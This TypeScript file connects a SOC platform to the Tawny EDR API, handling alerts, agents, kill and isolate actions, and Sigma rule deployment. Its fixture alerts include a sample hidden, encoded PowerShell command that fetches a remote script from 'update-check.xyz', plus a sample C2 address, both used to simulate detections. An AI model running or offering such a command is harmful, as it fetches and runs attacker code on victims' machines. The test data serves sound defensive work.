import { createHash } from "node:crypto";
import { httpJson, type HttpOptions } from "./http";
import type {
  AlertQuery, NormalisedAlert, NormalisedAsset, ProviderHealth, ResponseActionRequest, ResponseActionResult, ResponseActionState,
  SecurityEventProvider, Severity,
} from "./types";

/**
 * Tawny EDR (Yuma IT's endpoint agent). Talks to the Tawny API with a `twny_` API token.
 * One integration serves one Tawny tenant: the token decides which agents and alerts are visible.
 */
export type TawnyConfig = {
  apiUrl: string;
  region: "ap-southeast-2" | "ap-southeast-4";
  mode: "fixture" | "live";
  tlsVerify?: boolean;
  caPem?: string;
};

export type TawnySecrets = { apiToken: string };

export type TawnyPlatform = "windows" | "macos" | "linux";

/** `GET /api/alerts` row (snake_case JSON). Only the fields blakSOC reads are typed. */
export type TawnyAlert = {
  id: number;
  alert_rule_id: string;
  rule_name: string;
  agent_id: string;
  hostname: string;
  agent_os?: TawnyPlatform;
  agent_os_version?: string;
  telemetry_event_id?: number;
  event_type?: string;
  occurred_at: string;
  received_at?: string;
  payload?: unknown;
  severity: "low" | "medium" | "high" | "critical";
  status?: string;
  title?: string;
  description?: string | null;
  enrichment?: unknown;
  created_at?: string;
  mitre_techniques?: string[];
};

/** `GET /api/agents` row (AgentSummary). */
export type TawnyAgent = {
  id: string;
  hostname: string;
  operating_system: TawnyPlatform;
  os_version?: string;
  agent_version?: string;
  architecture?: string;
  status: "online" | "stale" | "offline" | "unknown" | "revoked";
  last_heartbeat_at?: string | null;
  enrolled_at?: string;
  public_ip?: string | null;
  tags?: string[];
};

/** `GET /api/alert-rules` / `POST /api/alert-rules/sigma` row. Only the fields blakSOC reads are typed. */
export type TawnyAlertRule = {
  id: string;
  name: string;
  format: string;
  external_id?: string | null;
  source_definition?: string | null;
  event_type?: string | null;
  severity?: string;
  operator?: string;
  payload_path?: string | null;
  match_value?: string | null;
  is_enabled?: boolean;
  mitre_techniques?: string[];
};

type TawnyActionType = "kill_process" | "isolate_host" | "release_host";
type TawnyActionStatus = "pending" | "dispatched" | "running" | "succeeded" | "failed" | "cancelled" | "expired";

/** `POST /api/agents/{id}/actions` and `GET /api/agents/{id}/actions` rows. */
export type TawnyAction = {
  id: string;
  agent_id: string;
  action_type: TawnyActionType;
  status: TawnyActionStatus;
  result?: { message?: string | null; result?: unknown } | null;
};

const SEVERITY: Record<TawnyAlert["severity"], { severity: Severity; level: number }> = {
  low: { severity: "low", level: 0 },
  medium: { severity: "medium", level: 1 },
  high: { severity: "high", level: 2 },
  critical: { severity: "critical", level: 3 },
};

const ACTIONS: Partial<Record<ResponseActionRequest["action"], TawnyActionType>> = {
  kill_process: "kill_process",
  isolate_endpoint: "isolate_host",
  release_endpoint: "release_host",
};

const OS_LABEL: Record<TawnyPlatform, string> = { windows: "Windows", macos: "macOS", linux: "Linux" };

function str(v: unknown): string | null {
  return typeof v === "string" && v.trim() ? v : null;
}

/** Tawny alert → blakSOC alert. `raw.alert.payload` keeps the telemetry so observable extraction sees it. */
export function normaliseTawnyAlert(a: TawnyAlert): NormalisedAlert {
  const sev = SEVERITY[a.severity] ?? SEVERITY.low;
  const payload = a.payload && typeof a.payload === "object" ? (a.payload as Record<string, unknown>) : {};
  const pid = typeof payload.pid === "number" && Number.isInteger(payload.pid) && payload.pid > 0 ? payload.pid : null;
  const raw: Record<string, unknown> = {
    alert: a,
    agent: { id: a.agent_id, name: a.hostname, os: { platform: a.agent_os ?? null, version: a.agent_os_version ?? null } },
  };
  // Lets a playbook kill_process step target the process that raised the alert.
  if (pid) raw.process = { pid, name: str(payload.name) };
  return {
    externalId: String(a.id),
    ruleId: a.alert_rule_id ?? null,
    title: str(a.title) ?? a.rule_name ?? "Tawny alert",
    description: a.description ?? null,
    category: a.event_type ?? null,
    siemSeverity: sev.level,
    severity: sev.severity,
    occurredAt: new Date(a.occurred_at ?? a.created_at ?? Date.now()),
    assetExternalId: a.agent_id ?? null,
    hostname: a.hostname ?? null,
    userName: str(payload.user) ?? str(payload.username) ?? str(payload.user_name),
    attackTechniques: a.mitre_techniques ?? [],
    routingKeys: a.agent_id ? [`agent:${a.agent_id}`] : [],
    raw,
  };
}

/**
 * Tawny agent → blakSOC asset. `raw.os.platform` is what the response executor reads. Tags become
 * `group:<tag>` routing keys so a shared integration's tenant links (selector.agentGroups) can route by tag.
 */
export function normaliseTawnyAgent(a: TawnyAgent): NormalisedAsset {
  const os = [OS_LABEL[a.operating_system] ?? a.operating_system, a.os_version].filter(Boolean).join(" ") || null;
  return {
    externalId: a.id,
    kind: "endpoint",
    name: a.hostname,
    hostname: a.hostname,
    ips: str(a.public_ip) ? [a.public_ip!.trim()] : [],
    os,
    macs: [],
    agentStatus: a.status ?? null,
    lastSeen: a.last_heartbeat_at ? new Date(a.last_heartbeat_at) : null,
    routingKeys: [`agent:${a.id}`, ...(a.tags ?? []).filter((t) => str(t)).map((t) => `group:${t}`)],
    raw: {
      id: a.id,
      hostname: a.hostname,
      status: a.status,
      agent_version: a.agent_version ?? null,
      architecture: a.architecture ?? null,
      enrolled_at: a.enrolled_at ?? null,
      last_heartbeat_at: a.last_heartbeat_at ?? null,
      public_ip: a.public_ip ?? null,
      tags: a.tags ?? [],
      os: { platform: a.operating_system, version: a.os_version ?? null },
    },
  };
}

/** Tawny only accepts a positive 32-bit integer PID. Process names are refused rather than guessed. */
export function parseTawnyPid(params: Record<string, unknown> | undefined): { pid: number } | { error: string } {
  const args = Array.isArray(params?.arguments) ? params.arguments : [];
  const raw = params?.pid ?? args[0];
  if (raw === undefined || raw === null || raw === "") return { error: "kill_process needs a process id (PID) on the target" };
  const text = String(raw).trim();
  if (!/^\d+$/.test(text)) return { error: `kill_process needs a numeric process id (PID), got "${text.slice(0, 60)}"` };
  const pid = Number(text);
  if (pid <= 0 || pid > 2_147_483_647) return { error: `kill_process process id ${text} is out of range` };
  return { pid };
}

/** Tawny action status → blakSOC provider state. Cancelled and expired are failures from the analyst's view. */
export function tawnyActionState(a: Pick<TawnyAction, "status" | "action_type" | "result">): ResponseActionState {
  const detail = str(a.result?.message);
  switch (a.status) {
    case "pending":
      return { state: "pending", message: `Tawny ${a.action_type} queued; delivered on the agent's next heartbeat` };
    case "dispatched":
    case "running":
      return { state: "running", message: `Tawny ${a.action_type} ${a.status} on the agent` };
    case "succeeded":
      return { state: "succeeded", message: detail ?? `Tawny ${a.action_type} succeeded` };
    case "expired":
      return { state: "failed", message: detail ?? `Tawny ${a.action_type} expired before the agent picked it up` };
    default:
      return { state: "failed", message: detail ? `Tawny ${a.action_type} ${a.status}: ${detail}` : `Tawny ${a.action_type} ${a.status}` };
  }
}

const FIXTURE_SEEN = "2026-01-15T00:00:00.000Z";
const FIXTURE_AGENT: TawnyAgent = {
  id: "7c0e2f4a-1b2c-4d5e-8f90-a1b2c3d4e5f6",
  hostname: "fixture-ws-01",
  operating_system: "windows",
  os_version: "10.0.26100",
  agent_version: "0.1.0",
  architecture: "x64",
  status: "online",
  last_heartbeat_at: FIXTURE_SEEN,
  enrolled_at: FIXTURE_SEEN,
  public_ip: "203.0.113.24",
  tags: ["fixture"],
};
const FIXTURE_ALERTS: TawnyAlert[] = [
  {
    id: 101, alert_rule_id: "0b6f1c58-3a3e-4c55-9d1e-2f1d6a0c0101", rule_name: "Encoded PowerShell", agent_id: FIXTURE_AGENT.id, hostname: FIXTURE_AGENT.hostname,
    agent_os: "windows", agent_os_version: "10.0.26100", telemetry_event_id: 9001, event_type: "process_launch", occurred_at: FIXTURE_SEEN, received_at: FIXTURE_SEEN,
    payload: { pid: 4242, ppid: 880, name: "powershell.exe", command_line: "powershell -nop -w hidden -enc SQBFAFgA http://update-check.xyz/p.ps1", user: "j.nguyen" },
    severity: "high", status: "open", title: "Encoded PowerShell", description: "PowerShell started with an encoded command.", created_at: FIXTURE_SEEN, mitre_techniques: ["T1059.001", "T1027"],
  },
  {
    id: 102, alert_rule_id: "0b6f1c58-3a3e-4c55-9d1e-2f1d6a0c0102", rule_name: "Known C2 address", agent_id: FIXTURE_AGENT.id, hostname: FIXTURE_AGENT.hostname,
    agent_os: "windows", agent_os_version: "10.0.26100", telemetry_event_id: 9002, event_type: "network_snapshot", occurred_at: FIXTURE_SEEN, received_at: FIXTURE_SEEN,
    payload: { source: "iphlpapi", connections: [{ pid: 4242, remote_address: "185.220.101.47", remote_port: 443 }] },
    severity: "critical", status: "open", title: "Known C2 address", description: null, created_at: FIXTURE_SEEN, mitre_techniques: ["T1071"],
  },
];

export class TawnyProvider implements SecurityEventProvider {
  readonly kind = "tawny";
  private readonly base: string;
  private readonly http: HttpOptions;

  constructor(private readonly cfg: TawnyConfig, private readonly secrets: TawnySecrets) {
    this.base = cfg.apiUrl.replace(/\/+$/, "");
    this.http = { tlsVerify: cfg.tlsVerify, caPem: cfg.caPem };
  }

  private get fixture() {
    return this.cfg.mode !== "live";
  }

  private api<T>(path: string, init: RequestInit & { json?: unknown } = {}): Promise<T> {
    return httpJson<T>(`${this.base}${path}`, { ...init, headers: { authorization: `Bearer ${this.secrets.apiToken}`, accept: "application/json", ...init.headers } }, this.http);
  }

  private async alerts(params: URLSearchParams): Promise<TawnyAlert[]> {
    if (this.fixture) {
      const after = Number(params.get("after_id") ?? 0);
      return FIXTURE_ALERTS.filter((a) => a.id > after).slice(0, Number(params.get("limit") ?? 500));
    }
    return this.api<TawnyAlert[]>(`/api/alerts?${params}`);
  }

  /** Pages forward by alert id. The cursor is the last id seen; without one, `since` bounds the first page. */
  async getAlerts(q: AlertQuery) {
    const params = new URLSearchParams({ limit: String(Math.min(Math.max(q.limit ?? 500, 1), 500)) });
    if (q.afterCursor) {
      if (!/^\d+$/.test(q.afterCursor)) throw new Error(`invalid Tawny cursor "${q.afterCursor.slice(0, 40)}"`);
      params.set("after_id", q.afterCursor);
    } else if (q.since) {
      params.set("since", q.since.toISOString());
    } else {
      params.set("after_id", "0");
    }
    const rows = await this.alerts(params);
    const agents = (q.routingKeys ?? []).filter((k) => k.startsWith("agent:")).map((k) => k.slice(6));
    const until = q.until?.getTime();
    const alerts = rows
      .map(normaliseTawnyAlert)
      .filter((a) => !agents.length || (a.assetExternalId !== null && agents.includes(a.assetExternalId)))
      .filter((a) => until === undefined || a.occurredAt.getTime() <= until);
    // Advance past every row returned, even ones filtered out, so the next page does not repeat them.
    const last = rows.at(-1);
    return { alerts, cursor: last ? String(last.id) : null };
  }

  async getAlert(externalId: string) {
    if (!/^\d+$/.test(externalId)) return null;
    if (this.fixture) {
      const row = FIXTURE_ALERTS.find((a) => String(a.id) === externalId);
      return row ? normaliseTawnyAlert(row) : null;
    }
    try {
      return normaliseTawnyAlert(await this.api<TawnyAlert>(`/api/alerts/${externalId}`));
    } catch (err) {
      if ((err as Error).message.startsWith("404 ")) return null;
      throw err;
    }
  }

  async searchEvents(q: AlertQuery) {
    if (q.query) throw new Error("Tawny does not run provider-native queries; write the detection as a Tawny alert rule");
    const { alerts } = await this.getAlerts({ ...q, limit: Math.min(q.limit ?? 100, 500) });
    return { total: alerts.length, events: alerts.map((a) => a.raw) };
  }

  /** Revoked agents are left out: they cannot heartbeat, so no action could ever reach them. */
  async getAssets(routingKeys?: string[]) {
    const rows = this.fixture ? [FIXTURE_AGENT] : await this.api<TawnyAgent[]>("/api/agents");
    const wanted = (routingKeys ?? []).filter((k) => k.startsWith("agent:") || k.startsWith("group:"));
    return rows
      .filter((a) => a.status !== "revoked")
      .map(normaliseTawnyAgent)
      .filter((a) => !wanted.length || a.routingKeys.some((k) => wanted.includes(k)));
  }

  async getAsset(externalId: string) {
    if (this.fixture) return externalId === FIXTURE_AGENT.id ? normaliseTawnyAgent(FIXTURE_AGENT) : null;
    if (!/^[0-9a-f-]{36}$/i.test(externalId)) return null;
    try {
      return normaliseTawnyAgent(await this.api<TawnyAgent>(`/api/agents/${externalId}`));
    } catch (err) {
      if ((err as Error).message.startsWith("404 ")) return null;
      throw err;
    }
  }

  /** Isolation and release are sent to Tawny, but agents without isolation support report them as failed. */
  supportedActions(): ResponseActionRequest["action"][] {
    return ["kill_process", "isolate_endpoint", "release_endpoint"];
  }

  async executeResponseAction(req: ResponseActionRequest): Promise<ResponseActionResult> {
    const type = ACTIONS[req.action];
    if (!type) return { ok: false, message: `Tawny does not support ${req.action}` };
    if (!/^[0-9a-f-]{36}$/i.test(req.assetExternalId)) return { ok: false, message: `"${req.assetExternalId.slice(0, 60)}" is not a Tawny agent id` };
    let payload: Record<string, unknown> = {};
    if (type === "kill_process") {
      const parsed = parseTawnyPid(req.params);
      if ("error" in parsed) return { ok: false, message: parsed.error };
      payload = { pid: parsed.pid };
    }
    const actionId = typeof req.params?.actionId === "string" ? req.params.actionId : undefined;
    const body = { action_type: type, payload, ...(actionId ? { idempotency_key: actionId } : {}) };

    let created: TawnyAction;
    if (this.fixture) {
      created = { id: `fixture:${type}:${req.assetExternalId}`, agent_id: req.assetExternalId, action_type: type, status: "pending" };
    } else {
      try {
        created = await this.api<TawnyAction>(`/api/agents/${req.assetExternalId}/actions`, { method: "POST", json: body });
      } catch (err) {
        return { ok: false, message: explain(err) };
      }
    }
    const state = tawnyActionState(created);
    // An idempotent replay can hand back an action that already finished.
    if (state.state === "succeeded" || state.state === "failed") return { ok: state.state === "succeeded", message: state.message, providerRef: created.id };
    return { ok: true, pending: true, providerRef: created.id, message: state.message };
  }

  async getResponseActionStatus(ref: { assetExternalId: string; providerRef: string }): Promise<ResponseActionState> {
    if (this.fixture) {
      const type = ref.providerRef.split(":")[1] as TawnyActionType | undefined;
      if (type === "kill_process") return { state: "succeeded", message: "[fixture] process terminated" };
      return { state: "failed", message: `[fixture] Tawny ${type ?? "action"} failed: this agent build does not support host isolation` };
    }
    if (!/^[0-9a-f-]{36}$/i.test(ref.assetExternalId) || !/^[0-9a-f-]{36}$/i.test(ref.providerRef)) {
      return { state: "failed", message: `"${ref.providerRef.slice(0, 60)}" is not a Tawny action on agent ${ref.assetExternalId.slice(0, 60)}` };
    }
    try {
      return tawnyActionState(await this.api<TawnyAction>(`/api/agents/${ref.assetExternalId}/actions/${ref.providerRef}`));
    } catch (err) {
      if ((err as Error).message.startsWith("404 ")) return { state: "failed", message: `Tawny has no action ${ref.providerRef} on this agent` };
      throw new Error(explain(err));
    }
  }

  /**
   * Imports the Sigma YAML as a Tawny alert rule; Tawny maps Sigma fields to its own telemetry. The same
   * YAML already on Tawny is reused (and re-enabled if a pause disabled it), so a redeploy does not duplicate it.
   */
  async deployDetection(sigmaYaml: string): Promise<{ providerRef: string; message: string }> {
    if (this.fixture) {
      return { providerRef: `fixture:${createHash("sha256").update(sigmaYaml).digest("hex").slice(0, 12)}`, message: "[fixture] Sigma rule imported" };
    }
    const existing = (await this.rules()).find((r) => r.format === "sigma" && r.source_definition === sigmaYaml);
    if (existing && existing.is_enabled !== false) return { providerRef: existing.id, message: `already on Tawny as "${existing.name}"` };
    if (existing) {
      try {
        await this.putEnabled(existing, true);
        return { providerRef: existing.id, message: `re-enabled on Tawny as "${existing.name}"` };
      } catch {
        /* Tawny would not re-enable it; import a fresh copy instead */
      }
    }
    try {
      const rule = await this.api<TawnyAlertRule>("/api/alert-rules/sigma", { method: "POST", json: { rule_yaml: sigmaYaml, is_enabled: true } });
      return { providerRef: rule.id, message: `imported to Tawny as "${rule.name}"` };
    } catch (err) {
      throw new Error(`Tawny rejected the Sigma rule: ${rejection(err)}`);
    }
  }

  /**
   * Stops a deployed rule. Disables it (match logic sent back unchanged, as Tawny requires for imported
   * rules); if Tawny refuses the update, deletes it instead, which Tawny allows only while it has no alerts.
   */
  async withdrawDetection(providerRef: string): Promise<{ message: string }> {
    if (this.fixture) return { message: "[fixture] Sigma rule disabled" };
    const rule = (await this.rules()).find((r) => r.id === providerRef);
    if (!rule) return { message: `Tawny rule ${providerRef} is already gone` };
    if (rule.is_enabled === false) return { message: `Tawny rule "${rule.name}" already disabled` };
    try {
      await this.putEnabled(rule, false);
      return { message: `disabled Tawny rule "${rule.name}"` };
    } catch (putErr) {
      try {
        await this.api(`/api/alert-rules/${rule.id}`, { method: "DELETE" });
        return { message: `deleted Tawny rule "${rule.name}" (Tawny would not disable it: ${rejection(putErr)})` };
      } catch (delErr) {
        throw new Error(`Tawny could not disable rule "${rule.name}": ${rejection(putErr)}; delete failed: ${rejection(delErr)}`);
      }
    }
  }

  async health(): Promise<ProviderHealth> {
    const start = Date.now();
    if (this.fixture) return { ok: true, latencyMs: 0, detail: { mode: "fixture", agents: 1 } };
    try {
      const status = await httpJson<{ status?: string }>(`${this.base}/api/health`, {}, this.http);
      const agents = await this.api<TawnyAgent[]>("/api/agents");
      return { ok: true, latencyMs: Date.now() - start, detail: { mode: "live", status: status.status, agents: agents.length } };
    } catch (err) {
      return { ok: false, latencyMs: Date.now() - start, detail: { mode: "live" }, error: explain(err) };
    }
  }

  private async rules(): Promise<TawnyAlertRule[]> {
    try {
      return await this.api<TawnyAlertRule[]>("/api/alert-rules");
    } catch (err) {
      throw new Error(explain(err));
    }
  }

  private putEnabled(rule: TawnyAlertRule, enabled: boolean) {
    return this.api<TawnyAlertRule>(`/api/alert-rules/${rule.id}`, {
      method: "PUT",
      json: {
        name: rule.name,
        event_type: rule.event_type ?? null,
        severity: rule.severity,
        operator: rule.operator,
        payload_path: rule.payload_path ?? null,
        match_value: rule.match_value ?? null,
        is_enabled: enabled,
        mitre_techniques: rule.mitre_techniques ?? [],
      },
    });
  }
}

/** Tawny problem details carry the importer's reason in `title`. */
function rejection(err: unknown): string {
  const message = (err as Error).message;
  if (message.startsWith("403 ")) return "Sigma rule changes need an Admin API token (403)";
  const body = message.slice(message.indexOf(": ") + 2);
  try {
    const problem = JSON.parse(body) as { title?: string; detail?: string };
    if (problem.title) return problem.detail ? `${problem.title} ${problem.detail}` : problem.title;
  } catch {
    // httpJson truncates the body; the title usually survives.
    const title = /"title":"((?:[^"\\]|\\.)*)"/.exec(body)?.[1];
    if (title) return title.replace(/\\"/g, '"');
  }
  return message;
}

function explain(err: unknown): string {
  const message = (err as Error).message;
  if (message.startsWith("401 ")) return `Tawny rejected the API token (401). Check it is current and not revoked. ${message}`;
  if (message.startsWith("403 ")) return `Tawny refused the request (403). Response actions need an Admin API token. ${message}`;
  return message;
}
